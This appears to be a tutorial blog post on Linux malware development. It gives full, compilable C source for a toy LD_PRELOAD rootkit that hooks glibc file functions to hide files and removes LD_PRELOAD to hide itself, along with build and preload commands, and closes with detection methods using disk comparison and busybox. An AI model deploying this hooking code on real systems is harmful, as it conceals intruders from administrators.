---
layout: post
category: Malware
tags: [hacking, programming, malwaredev]
---

If you are not interested in malware development for Linux and have
not read some of my previous blog posts, this blog post may be too
technical for you. You could rather start [here]({% post_url 2023-10-24-a-survey-of-linux-rootkits %})

In this blog post, I want to present a toy `LD_PRELOAD` rootkit.
It works by hijacking the dynamic linker and thus hiding itself from
the system. Later, we will talk about how to detect it.

## Preliminaries
Usually, when an ELF file is executed, first the dynamic linker
resolves the functions imported from other libraries.
When a function such as `open()` is encountered by the linker and not
defined in the binary itself, the linker searches for it in various
places. The order of these places is documented in the man page of
`ld.so` and is not that important in this exposition.

When the first instance of the function is encountered, it is
used. The dynamic linker does not search further. In particular, if
the function exists at multiple places, the first instance is used.

The idea of an `LD_PRELOAD` rootkit is that a malicious library -- the
rootkit -- is placed before the legitimate libraries in the search
order of the dynamic linker. This can be achieved, e.g., by
exporting the full path of the rootkit with the command `export LD_PRELOAD=<full
path to rootkit>`, or by tampering with `/etc/ld.so.conf`.

Then, legitimate function calls are hijacked by the rootkit. The
rootkit can use these to hide its presence. Let me show you an example.

```
[user toykit]$ ls
README.md  toykit.c  toykit.so
[user toykit]$ gcc toykit.c -o toykit.so -fPIC -shared -ldl -D_GNU_SOURCE
[user toykit]$ export LD_PRELOAD=$(pwd)/toykit.so
[user toykit]$ ls
README.md
[user toykit]$ 
[user toykit]$ less toykit.c 
toykit.c: No such file or directory
[user toykit]$ cat toykit.c 
cat: toykit.c: No such file or directory
```

Here, the rootkit called toykit still exists in the directory, but
cannot be seen. Toykit hooks various functions in glibc that are
invoked by `ls`, `less` and `cat`. Internally, it executes the original
functions, looks if its own name is in the output, and when that is
the case it removes its own name and returns the cleaned output.

In our implementation, the files can still be seen by the shell
completion, though that is only the case, because i apparently forgot
to hook some more functions.

When executing `ls` with more debugging output, we can see the search
order of the dynamic linker and that our rootkit is placed first.
In the output below, the dynamic linker searches for the symbol
`_res`, which is not implemented in toykit and hence the search
continues at the other locations.

```
[user toykit]$ LD_DEBUG=symbols ls 2>&1 | head
      2454:	symbol=__vdso_clock_gettime;  lookup in file=linux-vdso.so.1 [0]
      2454:	symbol=__vdso_gettimeofday;  lookup in file=linux-vdso.so.1 [0]
      2454:	symbol=__vdso_time;  lookup in file=linux-vdso.so.1 [0]
      2454:	symbol=__vdso_getcpu;  lookup in file=linux-vdso.so.1 [0]
      2454:	symbol=__vdso_clock_getres;  lookup in file=linux-vdso.so.1 [0]
      2454:	symbol=_res;  lookup in file=ls [0]
      2454:	symbol=_res;  lookup in file=/home/user/toykit/toykit.so [0]  <--- My rootkit is first in the library search order
      2454:	symbol=_res;  lookup in file=/lib64/libselinux.so.1 [0]
      2454:	symbol=_res;  lookup in file=/lib64/libcap.so.2 [0]
      2454:	symbol=_res;  lookup in file=/lib64/libc.so.6 [0]
```

## Source Code

Here is the commented source code of toykit.
In a real rootkits, we could also have some malicious functionality,
such as hiding of network sockets, malicious users, etc.

{% highlight C %}
// gcc toykit.c -o toykit.so -fPIC -shared -ldl -D_GNU_SOURCE (-DDebug)

#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/stat.h>

 
#define HIDE_MAGIC "toykit"

// First and foremost, we remove the LD_PRELOAD to hide the presence
// of toykit. This removes it from env, but not from
// /proc/self/environ
static __attribute__((constructor)) void begin() {
    unsetenv("LD_PRELOAD");
}

// We hook readdir and remove files that start with HIDE_MAGIC
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig_readdir)(DIR *dirp);
    orig_readdir = dlsym(RTLD_NEXT, "readdir");
    #ifdef DEBUG
    puts("readdir hooked");
    #endif

    struct dirent *dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        if(strstr(dir->d_name,HIDE_MAGIC) == 0) break;
    }
    return dir;
}

// We hook open and hide files that start with HIDE_MAGIC
int open(const char *pathname, int flags, mode_t mode) {
    int (*orig_open)(const char *pathname, int flags, mode_t mode);
    orig_open = dlsym(RTLD_NEXT, "open");
    #ifdef DEBUG
    printf("open hooked %s.\n", pathname);
    #endif

    if(strstr(pathname,HIDE_MAGIC) != NULL) {
      errno = ENOENT;
      return -1;
    }
    return orig_open(pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode) {
    int (*orig_open64)(const char *pathname, int flags, mode_t mode);
    orig_open64 = dlsym(RTLD_NEXT, "open64");
    #ifdef DEBUG
    printf("open64 hooked %s.\n", pathname);
    #endif

    if(strstr(pathname,HIDE_MAGIC) != NULL) {
      errno = ENOENT;
      return -1;
    }
    return orig_open64(pathname, flags, mode);
}

// We hook stat and hide files that start with HIDE_MAGIC
// This is e.g., used by less
int stat(const char *pathname, struct stat *statbuf) {
    int (*orig_stat)(const char *pathname, struct stat *statbuf);
    orig_stat = dlsym(RTLD_NEXT, "stat");
    #ifdef DEBUG
    printf("stat hooked %s.\n", pathname);
    #endif

    if(strstr(pathname,HIDE_MAGIC) != NULL) {
      errno = ENOENT;
      return -1;
    }
    return orig_stat(pathname, statbuf);
}

int stat64(const char *pathname, struct stat64 *statbuf) {
    int (*orig_stat64)(const char *pathname, struct stat64 *statbuf);
    orig_stat64 = dlsym(RTLD_NEXT, "stat64");
    #ifdef DEBUG
    printf("stat64 hooked %s.\n", pathname);
    #endif

    if(strstr(pathname,HIDE_MAGIC) != NULL) {
      errno = ENOENT;
      return -1;
    }
    return orig_stat64(pathname, statbuf);
}
{% endhighlight %}

## Detection
Detecting this approach is fairly simple, but let us first discuss
approaches that will not work.

As shown above, we could
check the library search path order of the dynamic linker for changes,
e.g., suspicious entries in `/etc/ld.so.config`). This works in our
toy rootkit, however, when the rootkit is
even better, these investigations may not yield results, as they will
use the hooked functions themselves.
As an example, in the toy rootkit we removed the variable
`LD_PRELOAD` that indicates presence of the rootkit. We could have
taken this even further.

What will work is comparing the content of the disk (obtained using
`dd`) with the file system itself. If there are files on the disk that
are not shown in the file system, then maybe an `LD_PRELOAD` rootkit is
hiding them. Note, that this comparison should not be done on
the infected machine itself.

A second approach is using statically linked binaries. When executing
a statically linked binary, there is no dynamic loader that can be
hooked. The most common approach is probably using `busybox`. Hence,
shell commands from within busybox cannot be hijacked by the rootkit
and hence can be used for such a forensic analysis.
